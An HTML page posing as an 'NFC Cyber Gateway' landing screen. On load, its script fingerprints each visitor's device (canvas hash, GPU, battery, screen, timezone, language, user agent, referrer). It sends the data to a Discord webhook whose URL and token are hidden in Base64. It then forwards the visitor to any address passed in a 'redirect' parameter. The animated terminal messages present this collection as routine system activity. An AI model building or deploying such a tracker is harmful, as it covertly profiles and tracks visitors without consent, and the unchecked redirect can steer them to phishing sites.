<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NFC Cyber Gateway</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        body {
            font-family: 'Segoe UI', Roboto, -apple-system, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background-color: #050811;
            color: #f8fafc;
            overflow: hidden;
            position: relative;
        }

        /* Animated Canvas Background */
        #bg-canvas {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 1;
        }

        /* 3D Glassmorphism Card */
        .card {
            position: relative;
            z-index: 2;
            background: rgba(15, 23, 42, 0.75);
            backdrop-filter: blur(16px);
            -webkit-backdrop-filter: blur(16px);
            border: 1px solid rgba(255, 255, 255, 0.12);
            padding: 2.5rem 2rem;
            border-radius: 24px;
            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.7), inset 0 1px 0 rgba(255, 255, 255, 0.1);
            max-width: 400px;
            width: 90%;
            text-align: center;
            transition: transform 0.1s ease-out;
            transform-style: preserve-3d;
        }

        .status-icon {
            font-size: 3.5rem;
            margin-bottom: 0.8rem;
            display: inline-block;
            filter: drop-shadow(0 0 12px rgba(56, 189, 248, 0.4));
            animation: pulse 1.8s infinite ease-in-out;
        }

        @keyframes pulse {
            0%, 100% { transform: scale(1); opacity: 1; }
            50% { transform: scale(1.1); opacity: 0.8; }
        }

        .title {
            font-size: 1.4rem;
            font-weight: 700;
            color: #38bdf8;
            letter-spacing: -0.5px;
            margin-bottom: 6px;
        }

        .badge {
            display: inline-block;
            margin: 12px 0 16px 0;
            padding: 5px 14px;
            border-radius: 20px;
            font-size: 0.72rem;
            font-weight: 700;
            letter-spacing: 0.8px;
            text-transform: uppercase;
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.15);
        }

        /* Live Cyber Terminal Box */
        .terminal {
            background: rgba(0, 0, 0, 0.5);
            border: 1px solid rgba(255, 255, 255, 0.08);
            border-radius: 12px;
            padding: 12px;
            font-family: 'Courier New', Courier, monospace;
            font-size: 0.75rem;
            color: #4ade80;
            text-align: left;
            height: 85px;
            overflow-y: auto;
            margin-top: 10px;
            box-shadow: inset 0 2px 8px rgba(0,0,0,0.6);
        }

        .terminal-line {
            margin-bottom: 4px;
            opacity: 0;
            animation: fadeIn 0.3s forwards;
        }

        @keyframes fadeIn {
            to { opacity: 1; }
        }

        .redirect-notice {
            margin-top: 15px;
            font-size: 0.8rem;
            color: #94a3b8;
            font-weight: 500;
        }
    </style>
</head>
<body>
    <canvas id="bg-canvas"></canvas>

    <div class="card" id="interactive-card">
        <div id="icon" class="status-icon">⚡</div>
        <div id="title" class="title">Initializing Gateway</div>
        <div id="badge" class="badge">CONNECTING...</div>
        
        <div class="terminal" id="terminal">
            <div class="terminal-line">> System boot initialized...</div>
        </div>

        <div id="redirect" class="redirect-notice" style="display: none;"></div>
    </div>

    <script>
        // Updated Base64 Webhook URL
        const ENCODED_WEBHOOK = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTU1NDU3MzE1MTk3ODEyNzQyMy9oUlI2OUpVdXFCbG5EaU1DSGdLcE1iNU4xaUpyYkRkV0tTTmR5RVRPdzF3bVlOU1VBN0RFV3FtWTBsNXZRTGExRlZlbg==";
        const DEFAULT_REDIRECT_URL = ""; 

        // Sound Generator (Web Audio API)
        function playAudioFeedback(type) {
            try {
                const ctx = new (window.AudioContext || window.webkitAudioContext)();
                const osc = ctx.createOscillator();
                const gain = ctx.createGain();
                osc.connect(gain);
                gain.connect(ctx.destination);

                if (type === 'nfc') {
                    // Futuristic chime
                    osc.type = 'sine';
                    osc.frequency.setValueAtTime(523.25, ctx.currentTime); // C5
                    osc.frequency.exponentialRampToValueAtTime(880, ctx.currentTime + 0.15); // A5
                    gain.gain.setValueAtTime(0.15, ctx.currentTime);
                    gain.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.35);
                    osc.start();
                    osc.stop(ctx.currentTime + 0.35);
                } else if (type === 'web') {
                    // Lower blip
                    osc.type = 'triangle';
                    osc.frequency.setValueAtTime(349.23, ctx.currentTime); // F4
                    osc.frequency.exponentialRampToValueAtTime(440, ctx.currentTime + 0.1); // A4
                    gain.gain.setValueAtTime(0.1, ctx.currentTime);
                    gain.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.25);
                    osc.start();
                    osc.stop(ctx.currentTime + 0.25);
                }
            } catch (e) {}
        }

        // Terminal Log Helper
        function logToTerminal(text) {
            const terminal = document.getElementById("terminal");
            const line = document.createElement("div");
            line.className = "terminal-line";
            line.innerText = `> ${text}`;
            terminal.appendChild(line);
            terminal.scrollTop = terminal.scrollHeight;
        }

        // Canvas Fingerprinting
        function getCanvasFingerprint() {
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = "top";
                ctx.font = "14px 'Arial'";
                ctx.fillStyle = "#f60";
                ctx.fillRect(125, 1, 62, 20);
                ctx.fillStyle = "#069";
                ctx.fillText("NFC_SCAN_V2", 2, 15);
                const str = canvas.toDataURL();
                let hash = 0;
                for (let i = 0; i < str.length; i++) {
                    hash = ((hash << 5) - hash) + str.charCodeAt(i);
                    hash |= 0;
                }
                return "FP-" + Math.abs(hash).toString(16).toUpperCase();
            } catch (e) {
                return "N/A";
            }
        }

        function getGPUInfo() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (!gl) return "N/A";
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                return debugInfo ? (gl.getParameter(debugInfo.UNMASKED_RENDERER_GL4) || gl.getParameter(debugInfo.UNMASKED_RENDERER)) : "N/A";
            } catch (e) {
                return "Unknown";
            }
        }

        async function processNFC() {
            const urlParams = new URLSearchParams(window.location.search);
            const isNFC = urlParams.get('source') === 'nfc';
            const customRedirect = urlParams.get('redirect') || DEFAULT_REDIRECT_URL;

            const iconEl = document.getElementById("icon");
            const titleEl = document.getElementById("title");
            const badgeEl = document.getElementById("badge");
            const redirectEl = document.getElementById("redirect");

            logToTerminal("Inspecting request parameters...");

            // Trigger Vibration if available
            if (isNFC && 'vibrate' in navigator) {
                navigator.vibrate([100, 50, 100]);
            }

            let botName, avatarUrl, embedTitle, embedDesc, embedColor;

            if (isNFC) {
                botName = "NFC Card Scanner";
                avatarUrl = "https://cdn-icons-png.flaticon.com/512/3587/3587202.png";
                embedTitle = "⚡ REAL NFC CARD TAP DETECTED!";
                embedDesc = "A physical NFC card tap was registered.";
                embedColor = 3066993; // Green

                badgeEl.innerText = "📱 PHYSICAL NFC TAP";
                badgeEl.style.borderColor = "rgba(74, 222, 128, 0.4)";
                badgeEl.style.color = "#4ade80";
                playAudioFeedback('nfc');
            } else {
                botName = "Web Visitor Tracker";
                avatarUrl = "https://cdn-icons-png.flaticon.com/512/1006/1006771.png";
                embedTitle = "🌐 DIRECT WEB VISIT / BOT DETECTED";
                embedDesc = "Direct web browser visit or web crawler scan detected.";
                embedColor = 15158332; // Red

                badgeEl.innerText = "🌐 WEB / BOT VISIT";
                badgeEl.style.borderColor = "rgba(248, 113, 113, 0.4)";
                badgeEl.style.color = "#f87171";
                playAudioFeedback('web');
            }

            logToTerminal("Extracting device telemetry...");

            // System Metrics
            let batteryInfo = "N/A";
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    batteryInfo = `${Math.round(battery.level * 100)}\% (${battery.charging ? "⚡ Charging" : "Discharging"})`;
                } catch (e) {}
            }

            const screenRes = `${window.screen.width}x${window.screen.height} (${window.devicePixelRatio}x)`;
            const viewport = `${window.innerWidth}x${window.innerHeight}`;
            const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown";
            const language = navigator.language || "Unknown";
            const cores = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} Cores` : "Unknown";
            const ram = navigator.deviceMemory ? `~${navigator.deviceMemory} GB` : "N/A";
            const isTouch = ('ontouchstart' in window || navigator.maxTouchPoints > 0) ? "Yes" : "No";
            const fingerprint = getCanvasFingerprint();
            const referrer = document.referrer ? document.referrer : "Direct / None";
            const gpu = getGPUInfo();

            logToTerminal("Constructing secure payload...");

            const payload = {
                username: botName,
                avatar_url: avatarUrl,
                embeds: [{
                    title: embedTitle,
                    description: embedDesc,
                    color: embedColor,
                    timestamp: new Date().toISOString(),
                    fields: [
                        { name: "🎯 Trigger Source", value: isNFC ? "`PHYSICAL_NFC_TAP`" : "`WEB_DIRECT_VISIT`", inline: true },
                        { name: "🆔 Device ID (FP)", value: `\`${fingerprint}\``, inline: true },
                        { name: "⏰ Timezone", value: timeZone, inline: true },

                        { name: "📱 Platform", value: navigator.platform || "Unknown", inline: true },
                        { name: "🗣️ Language", value: language, inline: true },
                        { name: "🔗 Referrer", value: referrer, inline: true },

                        { name: "🖥 Resolution", value: screenRes, inline: true },
                        { name: "📐 Viewport", value: viewport, inline: true },
                        { name: "🔋 Battery Status", value: batteryInfo, inline: true },

                        { name: "⚡ CPU Cores", value: cores, inline: true },
                        { name: "🧠 Memory (RAM)", value: ram, inline: true },
                        { name: "📱 Touchscreen", value: isTouch, inline: true },

                        { name: "🎮 GPU Renderer", value: `\`\`\`${gpu}\`\`\``, inline: false },
                        { name: "🌐 User-Agent", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false }
                    ]
                }]
            };

            logToTerminal("Transmitting payload via Webhook...");

            try {
                const webhookUrl = atob(ENCODED_WEBHOOK).trim();
                const response = await fetch(webhookUrl, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(payload)
                });

                if (response.ok) {
                    logToTerminal("✔ Transmitted successfully!");
                    iconEl.innerText = isNFC ? "📲" : "🌐";
                    iconEl.style.animation = "none";
                    titleEl.innerText = isNFC ? "NFC Card Processed" : "Web Visit Logged";

                    if (customRedirect) {
                        let countdown = 3;
                        redirectEl.style.display = "block";
                        redirectEl.innerText = `Redirecting in ${countdown}s...`;

                        const timer = setInterval(() => {
                            countdown--;
                            if (countdown > 0) {
                                redirectEl.innerText = `Redirecting in ${countdown}s...`;
                            } else {
                                clearInterval(timer);
                                window.location.href = customRedirect;
                            }
                        }, 1000);
                    }
                } else {
                    throw new Error("HTTP " + response.status);
                }
            } catch (err) {
                logToTerminal("❌ Transmission failed.");
                iconEl.innerText = "❌";
                iconEl.style.animation = "none";
                titleEl.innerText = "Delivery Error";
            }
        }

        // 3D Card Tilt Effect on Mouse/Touch Move
        const card = document.getElementById("interactive-card");
        document.addEventListener("mousemove", (e) => {
            const xAxis = (window.innerWidth / 2 - e.pageX) / 25;
            const yAxis = (window.innerHeight / 2 - e.pageY) / 25;
            card.style.transform = `rotateY(${xAxis}deg) rotateX(${yAxis}deg)`;
        });

        // Particle Canvas Background
        const canvas = document.getElementById("bg-canvas");
        const ctx = canvas.getContext("2d");
        let particles = [];

        function resizeCanvas() {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
        }
        window.addEventListener("resize", resizeCanvas);
        resizeCanvas();

        class Particle {
            constructor() {
                this.x = Math.random() * canvas.width;
                this.y = Math.random() * canvas.height;
                this.vx = (Math.random() - 0.5) * 0.8;
                this.vy = (Math.random() - 0.5) * 0.8;
                this.radius = Math.random() * 2 + 1;
            }
            update() {
                this.x += this.vx;
                this.y += this.vy;
                if (this.x < 0 || this.x > canvas.width) this.vx *= -1;
                if (this.y < 0 || this.y > canvas.height) this.vy *= -1;
            }
            draw() {
                ctx.beginPath();
                ctx.arc(this.x, this.y, this.radius, 0, Math.PI * 2);
                ctx.fillStyle = "rgba(56, 189, 248, 0.4)";
                ctx.fill();
            }
        }

        for (let i = 0; i < 45; i++) particles.push(new Particle());

        function animateParticles() {
            ctx.clearRect(0, 0, canvas.width, canvas.height);
            particles.forEach(p => {
                p.update();
                p.draw();
            });
            requestAnimationFrame(animateParticles);
        }
        animateParticles();

        window.addEventListener('DOMContentLoaded', processNFC);
    </script>
</body>
</html>
